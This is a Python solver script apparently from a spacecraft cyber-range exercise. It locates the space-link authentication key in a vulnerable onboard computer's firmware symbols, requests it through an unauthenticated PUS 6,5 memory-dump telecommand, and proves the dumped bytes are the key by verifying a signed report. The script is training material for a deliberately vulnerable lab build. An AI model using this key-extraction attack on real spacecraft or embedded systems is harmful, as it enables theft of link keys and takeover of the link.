#!/usr/bin/env python3
"""EX-F02 model solution: ask the OBC for the key, and prove that what comes back is the key.

The attacker is where EX-F01's was: on the space link, with a transmitter. Nothing overflows this
time. PUS 6,5 is a memory dump - a maintenance service that reads memory and sends it down - and
the vulnerable OBC serves whatever address it is asked for.

WHY THE KEY IS IN THE OBC AT ALL. `cr_sdls_key` is a `static const` in
firmware/common/cuberange_keys.h, so wherever it is used it is compiled into .rodata, which on this
part is flash. This OBC signs its reports (EX-D01), so the 32 octets that guard the space link are
in its flash too, at an address its own symbol table names. One key, several images, and every
copy is a place to read it.

WHY IT IS PROVED BY USE. Thirty-two octets that look like the key are a guess, and the range's key
is deliberately a string anybody would recognise. Thirty-two octets that verify the trailer on a
report the spacecraft signed are the key. So the solver checks the trailer of the very report
that carried them, and the verifier checks another report from the same run as well.

Usage:
    python3 exercises/EX-F02-key-extraction/solve.py               # against a running scenario
    python3 exercises/EX-F02-key-extraction/solve.py --show        # print the request and stop
"""
# No `from __future__ import annotations`, on purpose. Verifiers load solve.py by path, and a
# @dataclass whose annotations are strings looks its module up in sys.modules - which a module
# loaded by path is not in unless the loader put it there. Measured with Python 3.12, loading this
# file the way EX-F01's verifier loads its own: AttributeError inside dataclasses, at import.
import argparse
import struct
import sys
import time
from dataclasses import dataclass
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "src"))

from cuberange import ports                                       # noqa: E402
from cuberange.gs.link import SpaceLink                           # noqa: E402
from cuberange.gs.station import GroundStation, PUS_TM_TIME_LEN   # noqa: E402
from cuberange.identity import spacecraft                         # noqa: E402
from cuberange.keys import SDLS_KEY                               # noqa: E402
from cuberange.paths import out_dir                               # noqa: E402
from cuberange.proto import pus_auth                              # noqa: E402
from cuberange.proto.frame import decode_tm_frame                 # noqa: E402
from cuberange.proto.pus import PusTm                             # noqa: E402
from cuberange.proto.spacepacket import SpacePacket               # noqa: E402

#: ECSS-E-ST-70-41C service 6, memory management: 6,5 asks for a dump and 6,6 reports it. The
#: field layout is this range's own subset - firmware/apps/obc/src/main.c says so above
#: SERVICE_MEMORY, and this file mirrors it rather than any standard.
SERVICE_MEMORY, SUBTYPE_DUMP, SUBTYPE_DUMP_REPORT = 6, 5, 6
MEM_UNIFIED = 0           #: the only memory id the OBC implements: the whole address space
DUMP_HDR = ">BIH"         #: memory id (1) | start address (4) | length (2), big-endian
DUMP_HDR_LEN = struct.calcsize(DUMP_HDR)
DUMP_MAX = 128            #: PUS6_DUMP_MAX in main.c - a packet-size limit in both builds, not a control

KEY_SYMBOL = "cr_sdls_key"
PUBLIC_SYMBOL = "obc_public_block"
PUBLIC_MAGIC = b"CRPUBLIC"     #: PUBLIC_BLOCK_MAGIC in main.c
PUBLIC_LEN = 64                #: PUBLIC_BLOCK_LEN in main.c

STT_OBJECT = 1


# --------------------------------------------------------------------------- the image

def _elf(elf: Path):
    data = elf.read_bytes()
    if data[:4] != b"\x7fELF" or data[4] != 1 or data[5] != 1:
        raise ValueError(f"{elf} is not a little-endian 32-bit ELF")
    e_shoff, = struct.unpack_from("<I", data, 0x20)
    e_shentsize, e_shnum, e_shstrndx = struct.unpack_from("<HHH", data, 0x2E)

    def section(i):
        s_name, s_type, s_flags, s_addr, s_off, s_size, s_link, _, _, s_entsize = \
            struct.unpack_from("<IIIIIIIIII", data, e_shoff + i * e_shentsize)
        return dict(name=s_name, type=s_type, flags=s_flags, addr=s_addr, off=s_off,
                    size=s_size, link=s_link, entsize=s_entsize)

    sections = [section(i) for i in range(e_shnum)]
    shstr = sections[e_shstrndx]
    for s in sections:
        start = shstr["off"] + s["name"]
        s["name"] = data[start:data.index(b"\x00", start)].decode()
    return data, sections


def object_symbols(elf: Path, name: str) -> list[tuple[int, int]]:
    """Every data object called `name` in the image, as (address, size).

    EX-F01's read_symbol, with two differences that matter for data. It does NOT clear bit 0: ARM
    sets bit 0 on a Thumb FUNCTION's st_value and EX-F01 masks it because its target is a function,
    but a key is a byte array, a byte array needs no alignment, and clearing bit 0 of an odd address
    would dump the octet before the key and drop the last one. And it returns every match rather
    than the first: a `static const` in a header is a separate local copy in each file that uses it,
    and if a second file ever does, that is a second copy to read - which a first-match lookup would
    hide.
    """
    data, sections = _elf(elf)
    symtab = next((s for s in sections if s["name"] == ".symtab"), None)
    if symtab is None:
        raise ValueError(f"{elf} has no .symtab - it was stripped")
    strtab = sections[symtab["link"]]
    found = []
    for off in range(symtab["off"], symtab["off"] + symtab["size"], symtab["entsize"]):
        st_name, st_value, st_size, st_info = struct.unpack_from("<IIIB", data, off)
        if st_info & 0xF != STT_OBJECT:
            continue
        start = strtab["off"] + st_name
        if data[start:data.index(b"\x00", start)].decode() == name:
            found.append((st_value, st_size))
    return found


def object_symbol(elf: Path, name: str) -> tuple[int, int]:
    """The one data object called `name`, as (address, size). Refuses none, and refuses two."""
    found = object_symbols(elf, name)
    if len(found) != 1:
        raise ValueError(f"{elf} has {len(found)} data objects called {name}: "
                         f"{[f'0x{a:08x}' for a, _ in found]}")
    return found[0]


def image_bytes(elf: Path, address: int, length: int) -> bytes:
    """What the image puts at `address`, read out of the section that holds it.

    For flash this is what the part will hold. For an initialised SRAM variable it is the value
    copied there at boot, which is how the premise test sees the public block's magic without
    running anything.
    """
    data, sections = _elf(elf)
    SHT_PROGBITS, SHF_ALLOC = 1, 0x2
    for s in sections:
        if s["type"] == SHT_PROGBITS and s["flags"] & SHF_ALLOC \
                and s["addr"] <= address and address + length <= s["addr"] + s["size"]:
            at = s["off"] + address - s["addr"]
            return data[at:at + length]
    raise ValueError(f"no section of {elf} holds 0x{address:08x}+{length}")


# --------------------------------------------------------------------------- the wire

def dump_request(address: int, length: int, mem_id: int = MEM_UNIFIED) -> bytes:
    """TC 6,5 application data."""
    return struct.pack(DUMP_HDR, mem_id, address, length)


@dataclass(frozen=True)
class Dump:
    """A TM 6,6, taken apart, with the packet it came in kept whole."""

    mem_id: int
    address: int
    data: bytes
    tm: PusTm
    packet: bytes        #: the Space Packet as it arrived, trailer and all - what a MAC check needs


def parse_dump_report(packet: bytes) -> Dump | None:
    """A TM 6,6 out of a Space Packet, or None if the packet is some other report.

    THE TRAILER. A signing OBC appends SEQ(4) | MAC(16) INSIDE the Space Packet, and the packet's
    length field covers it, so to a parser that is not checking signatures the trailer is simply
    the last twenty octets of the application data. The dump's own length field says where the
    dumped octets end; the trailer is whatever follows. It is left in `packet` rather than stripped,
    because it is the thing that proves what the dump contains.
    """
    tm = PusTm.decode(SpacePacket.decode(packet).data, time_len=PUS_TM_TIME_LEN)
    if (tm.service, tm.subtype) != (SERVICE_MEMORY, SUBTYPE_DUMP_REPORT):
        return None
    if len(tm.app_data) < DUMP_HDR_LEN:
        raise ValueError(f"a TM 6,6 starts with {DUMP_HDR_LEN} octets; this one has "
                         f"{len(tm.app_data)}")
    mem_id, address, length = struct.unpack_from(DUMP_HDR, tm.app_data)
    data = tm.app_data[DUMP_HDR_LEN:DUMP_HDR_LEN + length]
    if len(data) != length:
        raise ValueError(f"the report says {length} octets and carries {len(data)}")
    return Dump(mem_id=mem_id, address=address, data=data, tm=tm, packet=packet)


def signed_by(packet: bytes, key: bytes) -> bool:
    """Whether `key` verifies the PUS-auth trailer on `packet` - the same check a station makes."""
    try:
        pus_auth.verify(packet, key=key)
    except pus_auth.AuthenticationError:
        return False
    return True


def await_report(link: SpaceLink, want, timeout: float, scid: int | None = None):
    """Read the downlink until a report satisfying `want(tm)` arrives.

    Returns (packet, seen): the Space Packet that matched, or None at the deadline, and every other
    report that arrived first, in order. The raw packet is kept because a MAC is checked over the
    octets as sent; GroundStation.collect() keeps decoded reports, which is the right thing for a
    station and the wrong thing for a solver that needs to verify a trailer with a key it just read.
    """
    seen: list = []
    deadline = time.time() + timeout
    while True:
        for frame in link.poll():
            try:
                _mc, _vc, packet = decode_tm_frame(frame, expect_scid=scid)
                tm = PusTm.decode(SpacePacket.decode(packet).data, time_len=PUS_TM_TIME_LEN)
            except ValueError:
                continue
            if want(tm):
                return packet, seen
            seen.append((packet, tm))
        if time.time() >= deadline:
            return None, seen


def is_dump_report(tm: PusTm) -> bool:
    return (tm.service, tm.subtype) == (SERVICE_MEMORY, SUBTYPE_DUMP_REPORT)


# --------------------------------------------------------------------------- the solver

def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--port", type=int, default=ports.link(0), help="space link port")
    ap.add_argument("--elf", type=Path,
                    default=out_dir() / "build-obc-f02-vuln" / "zephyr" / "zephyr.elf",
                    help="the OBC image, read to find where the key is")
    ap.add_argument("--timeout", type=float, default=20.0, help="seconds to wait for the report")
    ap.add_argument("--show", action="store_true", help="print the request and exit")
    args = ap.parse_args()

    address, size = object_symbol(args.elf, KEY_SYMBOL)
    request = dump_request(address, size)
    print(f"{KEY_SYMBOL} is {size} octets at 0x{address:08x} in {args.elf}")
    print(f"TC {SERVICE_MEMORY},{SUBTYPE_DUMP} application data: {request.hex()}")
    if args.show:
        return 0

    link = SpaceLink(port=args.port)
    link.connect(retries=60)
    try:
        #: The operator's own station class, sending a plain telecommand: this OBC does not
        #: verify telecommands, so a dump request needs nothing an attacker does not have.
        GroundStation(link).send_pus(SERVICE_MEMORY, SUBTYPE_DUMP, request)
        packet, _ = await_report(link, is_dump_report, args.timeout, scid=spacecraft(0).scid)
    finally:
        link.close()
    if packet is None:
        print(f"no TM {SERVICE_MEMORY},{SUBTYPE_DUMP_REPORT} within {args.timeout:.0f} s. Read the "
              f"OBC console: a REJECTED line means this is the mitigated build.")
        return 1

    dump = parse_dump_report(packet)
    print(f"TM {SERVICE_MEMORY},{SUBTYPE_DUMP_REPORT}: {len(dump.data)} octets from "
          f"0x{dump.address:08x}")
    print(f"  {dump.data.hex()}")
    print(f"  {dump.data.decode('ascii', errors='replace')!r}")

    #: The proof. The report that carried these octets was signed by the spacecraft; if they are
    #: the key, they verify it.
    verified = signed_by(packet, dump.data)
    if verified:
        print("  and they verify the trailer on the report that carried them: this is the key")
    else:
        print("  they do NOT verify the trailer on the report that carried them")
    if dump.data != SDLS_KEY:
        print("they are not cuberange.keys.SDLS_KEY")
        return 1
    print("they are cuberange.keys.SDLS_KEY - the key that authenticates the space link")
    if not verified:
        print("...and yet they verify nothing here. Is this an OBC that signs its reports?")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
